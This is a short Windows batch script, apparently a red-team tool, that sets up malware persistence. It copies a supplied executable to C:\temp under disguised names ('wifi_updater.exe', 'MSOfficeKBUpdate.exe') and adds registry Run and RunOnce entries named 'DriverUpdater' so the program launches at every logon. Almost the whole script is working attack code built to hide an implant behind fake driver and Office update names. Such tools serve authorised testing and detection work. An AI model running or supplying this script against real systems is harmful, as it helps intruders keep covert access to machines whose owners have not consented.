@echo off

echo "+---_--------------------------------------------+"
echo "|    Adversarial Informatics Combat Win Persist  |"
echo "|             cygienesolutions.com               |"
echo "|     [Usage]: ./%0 <EXE>                        |"
echo "+------------------------------------------------+"

set FILE=%1
echo.

REM General Registry Persistence
echo [+] Applying Standard Registry Persistence to: %FILE%
echo [*] Creating temp directory...
mkdir c:\temp\
echo.
echo [+] Copying %FILE% to C:\Temp as wifi_updater.exe
copy %FILE% c:\temp\wifi_updater.exe
echo.
echo [+] Configuring Registry Persistence with Wireless Cover...
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /f /v DriverUpdater /t REG_SZ /d "C:\Temp\Wifi_Updater.exe"
echo "Done."
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run


REM Extended Registry Persistence
echo.
echo [+] Applying Extened Registry Persistence to: %FILE%
echo.
echo [+] Copying %FILE% to C:\Temp as MSOfficeKBUpdate.exe
copy %FILE% c:\temp\MSOfficeKBUpdate.exe
echo.
echo [+] Configuring Extended Registry Persistence with Microsoft cover...
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v DriverUpdater /t REG_SZ /d "C:\Temp\MSOfficeKBUpdate.exe"
echo "Done."
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce


